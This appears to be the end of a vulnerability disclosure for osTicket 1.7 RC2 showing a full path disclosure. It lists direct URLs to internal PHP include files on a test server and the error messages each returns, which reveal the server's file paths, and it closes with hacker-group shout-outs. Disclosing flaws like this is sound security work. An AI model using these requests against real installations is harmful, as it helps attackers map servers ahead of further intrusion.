+Fatal error: Class 'Mail' not found in C:\Program Files\Apache Software Foundation\Apache2.2\htdocs\learn\osTicket-osTicket-1.7-1.7-RC2-3-gafe7853\include\pear\Mail\mail.php on line 26
+
+
+
+
+
+http://192.168.0.15/learn/osTicket-osTicket-1.7-1.7-RC2-3-gafe7853/include/pear/Mail/mime.php
+
+
+Warning: require_once(PEAR.php) [function.require-once]: failed to open stream: No such file or directory in C:\Program Files\Apache Software Foundation\Apache2.2\htdocs\learn\osTicket-osTicket-1.7-1.7-RC2-3-gafe7853\include\pear\Mail\mime.php on line 65
+
+Fatal error: require_once() [function.require]: Failed opening required 'PEAR.php' (include_path='.;C:\php5\pear') in C:\Program Files\Apache Software Foundation\Apache2.2\htdocs\learn\osTicket-osTicket-1.7-1.7-RC2-3-gafe7853\include\pear\Mail\mime.php on line 65
+
+
+
+
+http://192.168.0.15/learn/osTicket-osTicket-1.7-1.7-RC2-3-gafe7853/include/pear/Mail/mimeDecode.php
+
+
+Warning: require_once(PEAR.php) [function.require-once]: failed to open stream: No such file or directory in C:\Program Files\Apache Software Foundation\Apache2.2\htdocs\learn\osTicket-osTicket-1.7-1.7-RC2-3-gafe7853\include\pear\Mail\mimeDecode.php on line 66
+
+Fatal error: require_once() [function.require]: Failed opening required 'PEAR.php' (include_path='.;C:\php5\pear') in C:\Program Files\Apache Software Foundation\Apache2.2\htdocs\learn\osTicket-osTicket-1.7-1.7-RC2-3-gafe7853\include\pear\Mail\mimeDecode.php on line 66
+
+
+
+
+
+http://192.168.0.15/learn/osTicket-osTicket-1.7-1.7-RC2-3-gafe7853/include/pear/Mail/mock.php
+
+
+Fatal error: Class 'Mail' not found in C:\Program Files\Apache Software Foundation\Apache2.2\htdocs\learn\osTicket-osTicket-1.7-1.7-RC2-3-gafe7853\include\pear\Mail\mock.php on line 28
+
+
+
+
+
+
+http://192.168.0.15/learn/osTicket-osTicket-1.7-1.7-RC2-3-gafe7853/include/pear/Mail/null.php
+
+
+Fatal error: Class 'Mail' not found in C:\Program Files\Apache Software Foundation\Apache2.2\htdocs\learn\osTicket-osTicket-1.7-1.7-RC2-3-gafe7853\include\pear\Mail\null.php on line 28
+
+
+
+
+
+
+http://192.168.0.15/learn/osTicket-osTicket-1.7-1.7-RC2-3-gafe7853/include/pear/Mail/sendmail.php
+
+http://192.168.0.15/learn/osTicket-osTicket-1.7-1.7-RC2-3-gafe7853/include/pear/Mail/smtp.php
+
+
+Fatal error: Class 'Mail' not found in C:\Program Files\Apache Software Foundation\Apache2.2\htdocs\learn\osTicket-osTicket-1.7-1.7-RC2-3-gafe7853\include\pear\Mail\smtp.php on line 47
+
+
+
+
+
+
+http://192.168.0.15/learn/osTicket-osTicket-1.7-1.7-RC2-3-gafe7853/include/pear/Net/SMTP.php
+
+
+Warning: require_once(PEAR.php) [function.require-once]: failed to open stream: No such file or directory in C:\Program Files\Apache Software Foundation\Apache2.2\htdocs\learn\osTicket-osTicket-1.7-1.7-RC2-3-gafe7853\include\pear\Net\SMTP.php on line 23
+
+Fatal error: require_once() [function.require]: Failed opening required 'PEAR.php' (include_path='.;C:\php5\pear') in C:\Program Files\Apache Software Foundation\Apache2.2\htdocs\learn\osTicket-osTicket-1.7-1.7-RC2-3-gafe7853\include\pear\Net\SMTP.php on line 23
+
+
+
+
+
+http://192.168.0.15/learn/osTicket-osTicket-1.7-1.7-RC2-3-gafe7853/include/pear/Net/Socket.php
+
+
+Warning: require_once(PEAR.php) [function.require-once]: failed to open stream: No such file or directory in C:\Program Files\Apache Software Foundation\Apache2.2\htdocs\learn\osTicket-osTicket-1.7-1.7-RC2-3-gafe7853\include\pear\Net\Socket.php on line 22
+
+Fatal error: require_once() [function.require]: Failed opening required 'PEAR.php' (include_path='.;C:\php5\pear') in C:\Program Files\Apache Software Foundation\Apache2.2\htdocs\learn\osTicket-osTicket-1.7-1.7-RC2-3-gafe7853\include\pear\Net\Socket.php on line 22
+
+
+
+
+
+
+http://192.168.0.15/learn/osTicket-osTicket-1.7-1.7-RC2-3-gafe7853/include/pear/PEAR/FixPHP5PEARWarnings.php
+
+
+Notice: Undefined variable: skipmsg in C:\Program Files\Apache Software Foundation\Apache2.2\htdocs\learn\osTicket-osTicket-1.7-1.7-RC2-3-gafe7853\include\pear\PEAR\FixPHP5PEARWarnings.php on line 2
+
+Notice: Undefined variable: ec in C:\Program Files\Apache Software Foundation\Apache2.2\htdocs\learn\osTicket-osTicket-1.7-1.7-RC2-3-gafe7853\include\pear\PEAR\FixPHP5PEARWarnings.php on line 5
+
+Fatal error: Class name must be a valid object or a string in C:\Program Files\Apache Software Foundation\Apache2.2\htdocs\learn\osTicket-osTicket-1.7-1.7-RC2-3-gafe7853\include\pear\PEAR\FixPHP5PEARWarnings.php on line 5
+
+
+
+
+
+
+http://192.168.0.15/learn/osTicket-osTicket-1.7-1.7-RC2-3-gafe7853/include/staff/footer.inc.php
+
+
+ Copyright © 2006-2012 osTicket.com.  All Rights Reserved.
+
+Notice: Undefined variable: thisstaff in C:\Program Files\Apache Software Foundation\Apache2.2\htdocs\learn\osTicket-osTicket-1.7-1.7-RC2-3-gafe7853\include\staff\footer.inc.php on line 6
+
+
+
+
+http://192.168.0.15/learn/osTicket-osTicket-1.7-1.7-RC2-3-gafe7853/include/staff/header.inc.php
+
+
+Notice: Undefined variable: ost in C:\Program Files\Apache Software Foundation\Apache2.2\htdocs\learn\osTicket-osTicket-1.7-1.7-RC2-3-gafe7853\include\staff\header.inc.php on line 24
+osTicket - Customer Support System
+
+Howdy,
+Notice: Undefined variable: thisstaff in C:\Program Files\Apache Software Foundation\Apache2.2\htdocs\learn\osTicket-osTicket-1.7-1.7-RC2-3-gafe7853\include\staff\header.inc.php on line 33
+
+Fatal error: Call to a member function getUserName() on a non-object in C:\Program Files\Apache Software Foundation\Apache2.2\htdocs\learn\osTicket-osTicket-1.7-1.7-RC2-3-gafe7853\include\staff\header.inc.php on line 33
+
+
+
+
+
+
+
+http://192.168.0.15/learn/osTicket-osTicket-1.7-1.7-RC2-3-gafe7853/include/staff/settings-alerts.inc.php
+
+
+Fatal error: Call to undefined function csrf_token() in C:\Program Files\Apache Software Foundation\Apache2.2\htdocs\learn\osTicket-osTicket-1.7-1.7-RC2-3-gafe7853\include\staff\settings-alerts.inc.php on line 2
+
+
+
+
+
+
+http://192.168.0.15/learn/osTicket-osTicket-1.7-1.7-RC2-3-gafe7853/include/staff/settings-attachments.inc.php
+Fatal error: Call to undefined function csrf_token() in C:\Program Files\Apache Software Foundation\Apache2.2\htdocs\learn\osTicket-osTicket-1.7-1.7-RC2-3-gafe7853\include\staff\settings-attachments.inc.php on line 7
+
+
+
+
+http://192.168.0.15/learn/osTicket-osTicket-1.7-1.7-RC2-3-gafe7853/include/staff/settings-autoresponders.inc.php
+
+Fatal error: Call to undefined function csrf_token() in C:\Program Files\Apache Software Foundation\Apache2.2\htdocs\learn\osTicket-osTicket-1.7-1.7-RC2-3-gafe7853\include\staff\settings-autoresponders.inc.php on line 2
+
+
+
+http://192.168.0.15/learn/osTicket-osTicket-1.7-1.7-RC2-3-gafe7853/include/staff/settings-dates.inc.php
+
+
+Fatal error: Class 'Misc' not found in C:\Program Files\Apache Software Foundation\Apache2.2\htdocs\learn\osTicket-osTicket-1.7-1.7-RC2-3-gafe7853\include\staff\settings-dates.inc.php on line 2
+
+
+
+
+
+
+http://192.168.0.15/learn/osTicket-osTicket-1.7-1.7-RC2-3-gafe7853/include/staff/settings-emails.inc.php
+
+
+Fatal error: Call to undefined function csrf_token() in C:\Program Files\Apache Software Foundation\Apache2.2\htdocs\learn\osTicket-osTicket-1.7-1.7-RC2-3-gafe7853\include\staff\settings-emails.inc.php on line 2
+
+
+
+
+
+http://192.168.0.15/learn/osTicket-osTicket-1.7-1.7-RC2-3-gafe7853/include/staff/settings-general.inc.php
+
+
+Fatal error: Call to undefined function csrf_token() in C:\Program Files\Apache Software Foundation\Apache2.2\htdocs\learn\osTicket-osTicket-1.7-1.7-RC2-3-gafe7853\include\staff\settings-general.inc.php on line 2
+
+
+
+
+
+http://192.168.0.15/learn/osTicket-osTicket-1.7-1.7-RC2-3-gafe7853/include/staff/settings-kb.inc.php
+
+
+Fatal error: Call to undefined function csrf_token() in C:\Program Files\Apache Software Foundation\Apache2.2\htdocs\learn\osTicket-osTicket-1.7-1.7-RC2-3-gafe7853\include\staff\settings-kb.inc.php on line 2
+
+
+
+
+
+
+http://192.168.0.15/learn/osTicket-osTicket-1.7-1.7-RC2-3-gafe7853/include/staff/settings-tickets.inc.php
+
+
+Fatal error: Call to undefined function csrf_token() in C:\Program Files\Apache Software Foundation\Apache2.2\htdocs\learn\osTicket-osTicket-1.7-1.7-RC2-3-gafe7853\include\staff\settings-tickets.inc.php on line 2
+
+
+
+
+
+
+http://192.168.0.15/learn/osTicket-osTicket-1.7-1.7-RC2-3-gafe7853/include/staff/tpl.inc.php
+
+
+Fatal error: Class 'Template' not found in C:\Program Files\Apache Software Foundation\Apache2.2\htdocs\learn\osTicket-osTicket-1.7-1.7-RC2-3-gafe7853\include\staff\tpl.inc.php on line 2
+
+
+
+
+
+http://192.168.0.15/learn/osTicket-osTicket-1.7-1.7-RC2-3-gafe7853/setup/inc/class.installer.php
+
+
+Notice: Use of undefined constant INCLUDE_DIR - assumed 'INCLUDE_DIR' in C:\Program Files\Apache Software Foundation\Apache2.2\htdocs\learn\osTicket-osTicket-1.7-1.7-RC2-3-gafe7853\setup\inc\class.installer.php on line 16
+
+Warning: require_once(INCLUDE_DIRclass.setup.php) [function.require-once]: failed to open stream: No such file or directory in C:\Program Files\Apache Software Foundation\Apache2.2\htdocs\learn\osTicket-osTicket-1.7-1.7-RC2-3-gafe7853\setup\inc\class.installer.php on line 16
+
+Fatal error: require_once() [function.require]: Failed opening required 'INCLUDE_DIRclass.setup.php' (include_path='.;C:\php5\pear') in C:\Program Files\Apache Software Foundation\Apache2.2\htdocs\learn\osTicket-osTicket-1.7-1.7-RC2-3-gafe7853\setup\inc\class.installer.php on line 16
+
+
+
+
+
+http://192.168.0.15/learn/osTicket-osTicket-1.7-1.7-RC2-3-gafe7853/setup/inc/header.inc.php
+
+
+osTicket
+
+
+    Notice: Undefined variable: wizard in C:\Program Files\Apache Software Foundation\Apache2.2\htdocs\learn\osTicket-osTicket-1.7-1.7-RC2-3-gafe7853\setup\inc\header.inc.php on line 17
+
+    Notice: Undefined variable: wizard in C:\Program Files\Apache Software Foundation\Apache2.2\htdocs\learn\osTicket-osTicket-1.7-1.7-RC2-3-gafe7853\setup\inc\header.inc.php on line 20
+
+    Warning: Invalid argument supplied for foreach() in C:\Program Files\Apache Software Foundation\Apache2.2\htdocs\learn\osTicket-osTicket-1.7-1.7-RC2-3-gafe7853\setup\inc\header.inc.php on line 20
+    Contact Us
+
+=========================== HAPPY NEW YEAR! ==================================
+
+
+================================================
+SHOUTZ+RESPECTS+GREAT THANKS TO ALL MY FRIENDS:
+================================================
+packetstormsecurity.org
+packetstormsecurity.com
+packetstormsecurity.net
+securityfocus.com
+cxsecurity.com
+security.nnov.ru
+securtiyvulns.com
+securitylab.ru
+secunia.com
+securityhome.eu
+exploitsdownload.com
+osvdb.com
+websecurity.com.ua
+1337day.com
+
+to all Aa Team + to all Azerbaijan Black HatZ
++ *Especially to my bro CAMOUFL4G3 *
+To All Turkish Hackers
+
+Also special thanks to: ottoman38 & HERO_AZE
+================================================
+
+/AkaStep
+
+#  0day.today [2023-03-22]  #
